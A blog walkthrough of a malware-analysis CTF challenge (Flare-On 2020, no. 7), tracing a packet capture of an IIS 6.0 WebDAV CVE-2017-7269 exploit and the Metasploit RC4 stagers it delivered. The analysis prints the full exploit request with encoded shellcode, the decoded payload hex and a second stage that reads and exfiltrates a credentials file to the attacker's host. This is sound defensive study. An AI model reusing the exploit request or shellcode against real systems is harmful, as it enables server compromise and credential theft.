---
source: spaceraccoon
source_url: https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020/
title: "Imposter Alert: Extracting and Reversing Metasploit Payloads (Flare-On 2020 Challenge 7) | Spaceraccoon's Blog"
published: 2020-12-03T13:04:53+00:00
description: "I recently participated in FireEye’s seventh annual Flare-On Challenge, a reverse engineering and malware analysis Capture The Flag (CTF) competition. Out of the 11 challenges ranging from typical executables to games written in exotic programming languages, I liked Challenge 7 the best."
---

[Get my new book with No Starch Press "From Day Zero to Zero Day: A Hands-On Guide to Vulnerability Research" here! 🚀](https://nostarch.com/zero-day)

# Imposter Alert: Extracting and Reversing Metasploit Payloads (Flare-On 2020 Challenge 7)

Dec 3, 2020
·

2476 words

·

12 minute read


![Incident reported!](https://spaceraccoon.dev/images/9/incident_reported.png)

I recently participated in FireEye’s [seventh annual Flare-On Challenge](https://www.fireeye.com/blog/threat-research/2020/08/announcing-the-seventh-annual-flare-on-challenge.html), a reverse engineering and malware analysis Capture The Flag (CTF) competition. Out of the 11 challenges ranging from typical executables to games written in exotic programming languages, I liked Challenge 7 the best. It featured a network traffic capture of a security breach with two stages. Having mostly worked in the red team, I enjoyed the opportunity to investigate Metasploit internals and shellcode from the perspective of a blue team.

As a beginner in malware analysis, I often found myself confused by tutorials that went from A to Z without explaining the thought process or tools used to get there. I hope that my detailed walkthrough of challenge 7 will be useful for other newcomers.

# Initial Triage [🔗](https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020/\#initial-triage)

The challenge kicked off with the following message:

> Hello,
>
> Here at Reynholm Industries we pride ourselves on everything.
> It’s not easy to admit, but recently one of our most valuable servers was breached.
> We don’t believe in host monitoring so all we have is a network packet capture.
> We need you to investigate and determine what data was extracted from the server, if any.
>
> Thank you.

I started out with a single `re_crowd.pcapng` network traffic capture file. First, I popped it into [VirusTotal](https://www.virustotal.com/), a file scanner and antivirus aggregator, to check if it triggered any Suricata/Snort alerts for a quick win.

![VirusTotal report for the network traffic file.](https://spaceraccoon.dev/images/9/virustotal_report_for_the_network_traffic_file.png)

Although the traffic did not trigger any alerts, one of VirusTotal’s antivirus engines detected exploit shellcode, so I made sure to keep an eye out for that. Next, I opened the network traffic capture file in Wireshark, a network protocol analyser.

![Initial Wireshark capture.](https://spaceraccoon.dev/images/9/initial_wireshark_capture.png)

A quick scroll through the network traffic revealed that it was mostly HTTP traffic to and from `it-dept.reynholm-industries.com` (`192.168.68.1`). I checked out what the web application on the server looked like by exporting all HTTP objects with `File` \> `Export Objects` \> `HTTP` to a folder, renaming the `%5c` file to `index.html` and opening it.

![The company forum with Jen&rsquo;s offending post.](https://spaceraccoon.dev/images/9/the_company_forum_with_jens_offending_post.png)

From the results, it seemed that the server was hosting a company forum thread. According to Jen’s post, she created a `C:\accounts.txt` file that contains everyone’s credentials on the server. That’s a bad idea, Jen!

![Welcome to the internet, Jen.](https://spaceraccoon.dev/images/9/welcome_to_the_internet_jen.png)

# Identifying the Infection Vector [🔗](https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020/\#identifying-the-infection-vector)

Now that I had a better idea of what’s going on, I took a closer look at the HTTP traffic. I like to use the following filter to get the most common types of web traffic (HTTP/HTTPS/DNS): `(http.request or ssl.handshake.type == 1 or tcp.flags eq 0x0002 or dns) and !(udp.port eq 1900)`. I noticed that `192.168.68.21` sent a series of `PROPFIND` requests to the server. I extracted the full HTTP request by right-clicking on the first PROPFIND request > `Follow` \> `HTTP Stream`:

```http
PROPFIND / HTTP/1.1
Host: 192.168.68.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Length: 0

HTTP/1.1 207 Multi-Status
Date: Thu, 16 Jul 2020 20:19:53 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Type: text/xml
Transfer-Encoding: chunked

<?xml version="1.0"?><a:multistatus xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/" xmlns:c="xml:" xmlns:a="DAV:"><a:response><a:href>http://192.168.68.1/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2020-06-05T14:21:13.801Z</a:creationdate><a:displayname>/</a:displayname><a:getetag>"54af82a5443bd61:3b2"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Fri, 05 Jun 2020 14:21:47 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response></a:multistatus>
```

From the Server header, I could tell that the forum was running on a Microsoft IIS 6.0 server. Upon inspecting the second `PROPFIND` request, I uncovered something more interesting:

![Looks like the infection vector!](https://spaceraccoon.dev/images/9/looks_like_the_infection_vector.png)

```http
PROPFIND / HTTP/1.1
Host: 192.168.68.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Length: 0
If: <http://192.168.68.1:80/AFRPWWBVQzHpAERtoPGOxDTKYBGmrxqhVCdIGMmNDzefUMySmeCdKhFobQXIDkhgEpnMeUniloxaFrfDCCBprACtWhHkrCVphXAmetqJqxATcnu............................................................................................................................> (Not <locktoken:write1>) <http://192.168.68.1:80/oxamUvbohSEvpUpVuakwGpSnAQoMYMshqrvwwjFDLrhpIfQlgCdAlvwhrhCpWoKXCgOMkAbpjBnwLDdfCGcxCAyShpvGEmVwncZIIFDjgilqkGt.........................................................................................................................................................................................................................................................................VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA>

HTTP/1.1 500 Internal Server Failure
Connection: close
Date: Thu, 16 Jul 2020 20:19:53 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Type: text/html
Content-Length: 67

<body><h1>HTTP/1.1 500 Internal Server Error(exception)</h1></body>
```

`192.168.68.21` sent a long `If` header containing a suspicious base64 string and caused a server error. Googling parts of this string, such as `VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA`, led me to a [blogpost](https://blog.csdn.net/MickeyMouse1928/article/details/71159858) about the IIS 6.0 WebDAV CVE-2017-7269 vulnerability and the [GitHub page for the Alpha2 payload encoder](https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/alpha2.c). Not suspicious at all! This looks like our initial infection vector.

# Extracting the First Payload [🔗](https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020/\#extracting-the-first-payload)

There were several write-ups about the CVE-2017-7269 exploit, including a [Fortinet blogpost](https://www.fortinet.com/blog/threat-research/buffer-overflow-attack-targeting-microsoft-iis-6-0-returns) that helpfully provided a Python decoder for the base64 payload.

Extracting the large base64 string from the request, I removed the initial decoder stub (`VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB`), before plugging it into an [adapted version of the decoder](https://github.com/axfla/Metasploit-AlphanumUnicodeMixed-decoder/blob/master/dcode.py):

```python
# https://github.com/axfla/Metasploit-AlphanumUnicodeMixed-decoder

import string

# UTF-8 encoded bytes of the shellcode
encoded_bytes = "YlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA"

l = len(encoded_bytes)/2

decoded_bytes = str()

for i in range(l):

    # iterating on even numbers as beginning of the block
    block = encoded_bytes[i*2:i*2+2]

    # returns the Unicode code point and masks by the lower 4 bits
    decoded_byte_low = ord(block[1]) & 0x0F

    # block[1]'s Unicode code point, bitshifted 4 bits to the right
    # block[0]'s Unicode code point, masked by the lower 4 bits
    # sum is masked by the lower 4 bits
    decoded_byte_high = ((ord(block[1]) >> 4) + (ord(block[0]) & 0x0F)) & 0x0F

    # chr() returns the ASCII character associated to the code point
    decoded_byte = chr(decoded_byte_low + (decoded_byte_high << 4))

    decoded_bytes += decoded_byte

printable_decoded_bytes = ''.join(
    c for c in decoded_bytes if c in string.printable)

# ASCII display
print printable_decoded_bytes

# hexadecimal display
b = bytearray(decoded_bytes)

print ''.join('{:02x}'.format(x) for x in b).upper()

f = open('output.bin', 'w')
f.write(decoded_bytes)
f.close()
```

The printable output contained an interesting `killervulture123` string, among others:

```console
`1dP0RRr(J&1<a|,
RWRJ<LxHQY I:I41
8u};}$uXX$fKXD$$[[aYZQ__Z]h32hws2_ThLw&)TPh)kPPPP@P@PhjhDh\jVWhtatNuhVjjVWh_6KXORj@hQjhXSSVPjVSWh_)u[Y]UWkillervulture123^1u1u10UEIu_Q\
FCE8820000006089E531C0648B50308B520C8B52148B72280FB74A2631FFAC3C617C022C20C1CF0D01C7E2F252578B52108B4A3C8B4C1178E34801D1518B592001D38B4918E33A498B348B01D631FFACC1CF0D01C738E075F6037DF83B7D2475E4588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE05F5F5A8B12EB8D5D6833320000687773325F54684C772607FFD5B89001000029C454506829806B00FFD5505050504050405068EA0FDFE0FFD5976A0568C0A84415680200115C89E66A1056576899A57461FFD585C0740CFF4E0875EC68F0B5A256FFD56A006A0456576802D9C85FFFD58B3681F64B584F528D0E6A406800100000516A006858A453E5FFD58D98000100005356506A005653576802D9C85FFFD501C329C675EE5B595D555789DFE8100000006B696C6C657276756C747572653132335E31C0AAFEC075FB81EF0001000031DB021C0789C280E20F021C168A140786141F881407FEC075E831DBFEC0021C078A140786141F88140702141F8A1417305500454975E55FC351\
```\
\
# Analyzing the First Payload [🔗](https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020/\#analyzing-the-first-payload)\
\
Although I suspected that the base64 string was a Meterpreter payload due to the close links between the Alpha2 encoder and Metasploit, exercising due diligence is always necessary, especially when dealing with malware samples. Once again, I scanned the string using VirusTotal.\
\
![VirusTotal report for the first payload.](https://spaceraccoon.dev/images/9/virustotal_report_for_the_first_payload.png)\
\
Yikes! After Googling `"\xfc\xe8\x86\x00\x00\x00\x60\x89" meterpreter` (the first 8 bytes of the shellcode), I ended up at a [Metasploit Github Issue](https://github.com/rapid7/metasploit-framework/issues/4275) which suggested that it might be the `windows/meterpreter/reverse_tcp` payload. Unfortunately, further checks disproved this hypothesis as I found that the second half of the shellcode was different. Digging deeper, I came across a [Metasploit pull diff](https://github.com/rapid7/metasploit-framework/pull/6017/files#diff-0b3c38ea5b4c381b1723d2e2f447e49efab7e4c613bd643247829056c3771838) for `modules/payloads/stagers/windows/reverse_tcp_rc4.rb` that matched the shellcode almost perfectly!\
\
When I compared the payload with Meterpreter’s reverse TCP shellcode, there were only a few differences:\
\
payload: `\xc0\xa8\x44\x15 => (+ convert to decimal) 192 168 68 21`\
meterpreter: `\x7F\x00\x00\x01 => (+ convert to decimal) 127 0 0 1`\
\
payload: `\x4b\x58\x4f\x52 => KXOR`\
meterpreter: `\x58\x4F\x52\x4B => XORK`\
\
payload: `\x6b\x69\x6c\x6c\x65\x72\x76\x75\x6c\x74\x75\x72\x65\x31\x32\x33 => killervulture123`\
meterpreter: `\x52\x43\x34\x4B\x65\x79\x4D\x65\x74\x61\x73\x70\x6C\x6F\x69\x74 => RC4KeyMetasploit`\
\
Based on these findings and the `reverse_tcp_rc4.rb` code, I could safely conclude that the payload was a `reverse_tcp_rc4` Meterpreter stager with `XORKEY` set to `KXOR`, `RC4Key` set to `killervulture123`, and `RHOST` set to `192.168.68.21`.\
\
For completeness, I performed additional static and dynamic analyses.\
\
According to this [blogpost](https://isc.sans.edu/forums/diary/Analyzing+Metasploit+ASP+NET+Payloads/26392/), Meterpreter payloads may contain a mov instruction of an 8-byte value ending with `0002` which contains the callback IP address and port. The blogpost was written for 64-bit payloads, so it did not apply fully to my 32-bit payload. Nevertheless, after disassembling the shellcode with [an online x86 disassembler](https://defuse.ca/online-x86-assembler.htm#disassembly2), I found the following instructions:\
\
```hexdump\
bd: 68 c0 a8 44 15          push   0x1544a8c0\
c2: 68 02 00 11 5c          push   0x5c110002\
```\
\
Referring to the `push` instruction of a 4-byte value ending with `0002`, I hex-decoded and decimal-encoded the first value `0x1544a8c0` to obtain `21 68 168 192`, which is the little-endian representation of `192 168 68 21`. Next, I converted `5c11` from network byte order to host byte order in Python:\
\
```python\
from socket import ntohs\
\
ntohs(int("5c11", 16)) # 4444\
```\
\
The callback port received was `4444`. These values formed part of the [`sockaddr_n`](https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2) struct used in connections.\
\
I also ran the shellcode through `scdbg`, a shellcode analysis tool that emulates and logs Windows application programming interface (API) calls:\
\
![scdbg output for the first payload.](https://spaceraccoon.dev/images/9/scdbg_output_for_the_first_payload.png)\
\
```console\
scdbg.exe C:\Users\IEUser\Desktop\flare\7\output.bin\
Loaded 18b bytes from file C:\Users\IEUser\Desktop\flare\7\output.bin\
Initialization Complete..\
Max Steps: 2000000\
Using base offset: 0x401000\
40109b  LoadLibraryA(ws2_32)\
4010ab  WSAStartup(190)\
4010ba  WSASocket(af=2, tp=1, proto=0, group=0, flags=0)\
4010d4  connect(h=42, host: 192.168.68.21 , port: 4444 ) = 71ab4a07\
4010f1  recv(h=42, buf=12fc5c, len=4, fl=0)\
Allocation (e5e5849) > MAX_ALLOC adjusting...\
40110c  VirtualAlloc(base=0 , sz=1000000) = 600000\
len being reset to 4096 from e5e5849\
401121  recv(h=42, buf=600100, len=1000, fl=0)\
len being reset to 4096 from e5e5849\
401121  recv(h=42, buf=600100, len=1000, fl=0)\
Stepcount 2000001\
```\
\
The above output showed that the payload called the `connect(h=42, host: 192.168.68.21, port: 4444)` function to retrieve the second encrypted payload.\
\
# Extracting the Second Payload [🔗](https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020/\#extracting-the-second-payload)\
\
Going back to the network traffic capture file, I applied the filter `tcp.port eq 4444` and revealed two connections to `192.168.68.21:4444`. The second connection had a much larger response than the first. According to the [RC4 stager assembly comments](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_recv_rc4.asm), the first connection retrieved the size of the second stage while the second connection downloaded and executed it. I dumped out the raw bytes of the second connection by right-clicking the row > `Follow` \> `TCP Stream` \> `Show and Save data as Raw` \> `Save as`.\
\
I discarded the first four bytes of the data containing the size of the payload and decrypted the rest with Ruby code that inverted [Metasploit’s RC4 encryption routine](https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/lib/msf/core/payload/windows/rc4.rb):\
\
```ruby\
irb(main):001:0> require 'openssl'\
=> true\
irb(main):002:0> c1 = OpenSSL::Cipher.new('RC4')\
irb(main):003:0> c1.key = 'killervulture123'\
irb(main):004:0> p = c1.update(["a4b1037390e4c88e97b0c95bc630dc6abdf4203886f93026afedd0881b924fe509cd5c2ef5e168f8082b48daf7599ad4bb9219ae107b6eed7b6db1854d1031d28a4e7f268b10fdf41cc17fab5a739202c0cb49d953d6df6c0381a021016e875f09fe9a699435844f01966e77eca3f3f52f6a3636ab4775b580cb47bd9f7638a54048579c36ad8e7945a320faed1f1849b88918482b5b6feef4c3d6dccc84eab10109b1314ba4055098b073ae9c14101b65bd93826c57b9757a2aeede10fb39ba96d0361fc2312cc54f33a513e1595692c51fa54e0e626edb5be87f8d01a67d012b02431f54b9bcd5ef2db3daef3dd068fedade60b117feea204a2ca1bba1b5c51292a9dbf111e38c58badc3d288666c86d0eabfa83d5246010681dc7afc7ac4513a3d972e7cc5179f567417cae7fc87e954609f6ef4b4502745210501cb76a7ceb00d759c3290237d0472e1e3af7e6ac821474eb4f6b572213f6f248d66bcbb4eda73268cbd06642d3c5f2c537df7d9f9f28c0743abeb8c0a773d0bbfa507c101edab123d6c481a5d3b62229096b21a65c38c6803dbe0823c7b11f6de6646695dc10a71342cd3bfadcda148dd05ac88135542fb5dc61d6287788c55870b52fcfea4f4d85560407f39074ce5d3c8a2b06b49fe66d79c06e3dd83e2008b7743d3699cd7f607d9cc9b3ad0c8e456dea3ddd091dda0b3a1cfccb8148ed5afacef8c623b01e2644a3d9ab0ed598b133655ded6ad3237f024ab3a2f81d7ed12f5fbe89615e2ce4b89619e549764e7ae892a370556f7d3cf9c1364469337ddf7937b8e0aae86a5dc93b180f4e283a31a87fefb819ac3663e889214d83a77e5703489be1279306e43b675fe56950003e8b01b7efa6b54b3682d4fb9fde8b27cca457ce2537445042f77ea2bf4fdf0f72d8664a3ef5c8262ac5887b97ab235b2b61d83f00370e7e14fafd7df78149c2a1851bd028bea524fd60b278274eace8793b3b7adc56d076c5010fcf43b5d45f4870bdac6576db113b5bcf9c528b001e83f1fa925b7779076ae0d4339a71ba24a5a5c8eb4c01b3d3cd2c228c0b4ccd2d5a8c9ab167707f7596e256c11dff057e77a2bae59aaef9f8b2f178d2b1dce903c2d4ff1f66cdb047f0b4d1f672fa1eb7f14de76e4210ec5d9430dd7f751c014546b6146cf7453658eceff337049c21eb9454a3fe23cbbb315c6275bded2790fe9117e2ae429b7904d15cefcd4b86934a74412dad0b351d81fd102c8efd8c681df5450ab5b409be0efafad2f74e58d83c1a1b113d992553ab78ac5449bb2a42b38066b563e290f8a58f37af97132be8fc5d4b718b4d9fc8ec07281fcb30921e6ddcb9de94b8e9cb5af7a2b0bb0fc338b727331be9bf452d863e346d12f6051227c528e4d261267e992b3f1f034d7972b983566d8e8233c209eb214a0c13adea291b58da10164320557df4b7fc2634688ba054af07d5d523b523b8fb07c6644a567fa06d867c333b23b79d9ca822b1799f00e776e9c768ae5c23ae9fc6459148836fbf0ad8c977ab2c2d8547bfe9818013d9dc1c210ff4c7790752a8068c576353b2fb7dbe6c1aae2ebdc6fd970a04edc0a30545db9b62bd34a9082553009036cfd96315a5f7f8e0d869fd7924607ba2aebdf2b4b9c2088465a96deba5d872a7b65921b9f411125d391d15756d8a2f58c2fc80025178a9fc7dde0d85a55718f8f0cc8e4c5ed76558744e8a4433a224e3565768babbf2b23298f1882ec3"].pack("H*"))\
irb(main):005:0> puts p\
<NON-ASCII VALUES>/IC:\accounts.txtintrepidmango\
```\
\
# Analyzing the Second Payload [🔗](https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020/\#analyzing-the-second-payload)\
\
The raw text of the second payload ended with the string `C:\accounts.txtintrepidmango`. Based on this observation, I suspected that the payload encrypted `C:\accounts.txt` with the key `intrepidmango` and exfiltrated it. The output of `scdbg` for the second payload seemed to support this due to the calls to `ReadFile` and `socket`.\
\
```console\
C:\PROGRA~2\scdbg>scdbg.exe C:\Users\IEUser\Desktop\flare\7\stage.bin\
Loaded 4d7 bytes from file C:\Users\IEUser\Desktop\flare\7\stage.bin\
Initialization Complete..\
Max Steps: 2000000\
Using base offset: 0x401000\
\
4013c6  CreateFileA(C:\accounts.txt) = 4\
4013e7  ReadFile(hFile=4, buf=12fa40, numBytes=100) = 0\
401433  WSAStartup(202)\
401339  socket(2, 1, 6) = 41\
401367   opcode 0f c8 not supported\
\
401367   0FC8                            bswap eax               step: 838128  foffset: 367\
eax=c0a84415  ecx=0         edx=120539    ebx=41\
esp=12fa14    ebp=12fa2c    esi=401000    edi=12fa24     EFL 5 C P\
\
401369   8945EC                          mov [ebp-0x14],eax\
40136c   8D45E8                          lea eax,[ebp-0x18]\
40136f   6A10                            push byte 0x10\
401371   50                              push eax\
\
Stepcount 838128\
```\
\
Next, I disassembled the payload in IDA Pro. According to the output, the program began by calling `sub_38F`, which in turn called the rest of the functions. Hence `sub_38F` appeared to be the `main` function.\
\
![Disassembly of the main function.](https://spaceraccoon.dev/images/9/disassembly_of_the_main_function.png)\
\
Among the first few instructions in `sub_38F`, `push 100h` stood out because it passed `256` (`100` in hex) as an argument to the next function call. `256` is significant as it is a constant that is commonly associated with RC4 encryption. RC4 uses a 256-byte state vector to generate the keystream. Looking at the other functions identified by IDA in the Functions window, I came across what looked very much like RC4’s key scheduling algorithm (KSA) in `sub_D4`:\
\
![Graph visualization of Key Scheduling Algorithm in the payload.](https://spaceraccoon.dev/images/9/graph_visualization_of_key_scheduling_algorithm_in_the_payload.png)\
\
According to Wikipedia, the standard KSA should look like this:\
\
```python\
for i from 0 to 255\
    S[i] = i\
endfor\
j = 0\
for i from 0 to 255\
    j = (j + S[i] + key[i mod keylength]) mod 256\
    swap values of S[i] and S[j]\
endfor\
```\
\
The assembly included tell-tale signs of RC4 encryption such as `xor ecx, ecx` (which sets `ecx` to `0`), followed by a loop that incremented `ecx` 256 times and stored it with `mov eax, ecx`. This resembled the first loop in the KSA pseudocode.\
\
Once I confirmed that the payload was using RC4 encryption, I inspected some of the variables (such as the encryption key and eventual exfiltration target) using dynamic analysis. Since the payload was pure shellcode, I needed to run it with a wrapper such as [Blobrunner](https://github.com/OALabs/BlobRunner).\
\
In the x64dbg (or rather, x32dbg) debugger, I opened `blobrunner.exe`, then pointed it to the shellcode by selecting `File` \> `Change Command Line` \> `"C:\Users\IEUser\Desktop\flare\7\blobrunner.exe" "C:\Users\IEUser\Desktop\flare\7\stage.bin"`. Next, I restarted the debugger (`Ctrl-F2`) and ran it (`F9`) to load Blobrunner. Blobrunner prompted me to navigate to the address (`Ctrl-g`) and set a breakpoint at the base address of the shellcode.\
\
![Debugging the shellcode with Blobrunner and x64dbg.](https://spaceraccoon.dev/images/9/debugging_the_shellcode_with_blobrunner_and_x64dbg.png)\
\
Once that was done, I hit `Enter` in the Blobrunner window, which executed the shellcode and triggered the breakpoint.\
\
```console\
 __________.__        ___.  __________\
 \______   \  |   ____\_ |__\______   \__ __  ____   ____   ___________\
 |    |  _/  |  /  _ \| __ \|       _/  |  \/    \ /    \_/ __ \_  __ \\
 |    |   \  |_(  <_> ) \_\ \    |   \  |  /   |  \   |  \  ___/|  | \/\
 |______  /____/\____/|___  /____|_  /____/|___|  /___|  /\___  >__|\
        \/                \/       \/           \/     \/     \/\
0.0.5\
[*] Using file: C:\Users\IEUser\Desktop\flare\7\stage.bin\
[*] Reading file...\
[*] File Size: 0x04d7\
[*] Allocating Memory....Allocated!\
[*]   |-Base: 0x00100000\
[*] Copying input data...\
[*] Using offset: 0x00000000\
[*] Navigate to the EP and set a breakpoint. Then press any key to jump to the shellcode.\
\
[*] Entry: 0x00100000\
[*] Jumping to shellcode\
```\
\
With the payload paused at the beginning of the shellcode, I could set more breakpoints. I knew that the main function was at offset `38F` according to IDA (which helpfully named it `sub_38F`), so I jumped to address `0x00100000 + 38F = 0x0010038F` (base address of the shellcode plus the offset for `main`) where I set a breakpoint. As I proceeded with the rest of the instructions (`F7` or `F8`), I noticed that the first `call dword ptr [eax]` was a call to `CreateFileA`, which creates a file handler. The call included the argument `C:\\accounts.txt` based on the `esp` register value on the right panel. Similarly, the next `call dword ptr [eax+8]` referenced `ReadFile`.\
\
![Viewing register values at the breakpoints.](https://spaceraccoon.dev/images/9/viewing_register_values_at_the_breakpoints.png)\
\
Moving on to `call 100D4` (remember this is the KSA function), the argument at the `edx` register was `intrepidmango`, confirming that this was the key used for the RC4 encryption. Finally, prior to `call 1003E`, I found the following instructions:\
\
```asm\
mov     eax, 0C0A84415h\
mov     dx, 539h\
call    1003E\
```\
\
Generally, if you see larger values being moved around that aren’t pointers, it’s always a good idea to try hex-decoding them. When I hex-decoded and decimal-encoded `0C0A84415`, I got the callback IP address, `192 168 68 21`. Likewise, `539` decoded to `1337`.\
\
To sum it up, the second payload encrypted the contents of `C:\accounts.txt` using RC4 with the key `intrepidmango`, then exfiltrated it to `192.168.68.21:1337`!\
\
# Decrypting the Key [🔗](https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020/\#decrypting-the-key)\
\
Back in Wireshark, I applied the `tcp.port eq 1337` filter, which returned only one TCP connection. Once again, I followed the TCP stream and output the data as a hexdump.\
\
![Hexdump of exfiltration traffic.](https://spaceraccoon.dev/images/9/hexdump_of_exfiltration_traffic.png)\
\
Next, I decoded and decrypted it in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hexdump%28%29RC4%28%7B%27option%27:%27UTF8%27,%27string%27:%27intrepidmango%27%7D,%27Latin1%27,%27Latin1%27%29&input=MDAwMDAwMDAgIDQzIDY2IDU3IDgzIGE1IDIzIDg5IDc3ICBiZSBhYyAxYiAxZiA4NyA4ZiA1OCA5MyAgIENmVy4uIy53IC4uLi4uLlguCjAwMDAwMDEwICAzZiAyNCBjZiAyYyBkMyA5YSBhOCBkMSAgMTEgYzQgYmMgYTYgN2YgY2QgMzggZGIgICA/JC4sLi4uLiAuLi4uLi44LgowMDAwMDAyMCAgYjMgM2MgMDMgNGIgYWIgZjUgNjAgYzUgIDYwIGQyIDBkIDFkIDE4IDg4IDQxIDViICAgLjwuSy4uYC4gYC4uLi4uQVsKMDAwMDAwMzAgIDRmIDA2IDE3IDZjIDllIDBiIDAxIDczICA5ZCA4MyA2MCAxOCBmYSA4YiBmZiBmOCAgIE8uLmwuLi5zIC4uYC4uLi4uCjAwMDAwMDQwICA0ZCA3OCBiMiBhNCAyNCA2ZiBhZSBiZCAgOTIgZDEgZWMgY2MgMmQgN2MgOGIgYmYgICBNeC4uJG8uLiAuLi4uLXwuLgowMDAwMDA1MCAgZDAgOGMgYmQgZTIgNDUgZWYgMTUgYjIgIDg4IGJjIGE0IDU5IGJlIDIwIGFjIGY5ICAgLi4uLkUuLi4gLi4uWS4gLi4KMDAwMDAwNjAgIDU3IGRmIDEwIGJhIGJjIGQ5IDExIDkzICA0MSAxOSAwMCA5YyAwMiAyNSBlZiBjNCAgIFcuLi4uLi4uIEEuLi4uJS4uCjAwMDAwMDcwICA0YSAyNiBmZCAyNSBjYSA5YiA4NSAxOSAgNjQgNGUgYzUgODQgOWYgYTEgMDAgMTggICBKJi4lLi4uLiBkTi4uLi4uLgowMDAwMDA4MCAgMmMgNjggMzAgZGMgNzAgNGMgZmUgODMgIGYxIGM3IDAwIDJiIDQ5IDdhIDgzIDA5ICAgLGgwLnBMLi4gLi4uK0l6Li4KMDAwMDAwOTAgIDA1IDc3IDZlIDBhIDA4IDhkIDU2IGU0ICAzOCA3ZSA4OCAwZiAyYyA0MSBlNCAzMyAgIC53bi4uLlYuIDh%2BLi4sQS4zCjAwMDAwMEEwICA2NiBjOSBiYyAwNiBhYSAyYSBhMSA5NiAgMmQgOTQgYzAgMDggMTYgMWUgYTQgZjIgICBmLi4uLiouLiAtLi4uLi4uLgowMDAwMDBCMCAgODEgMWEgODMgZjcgN2MgYjUgN2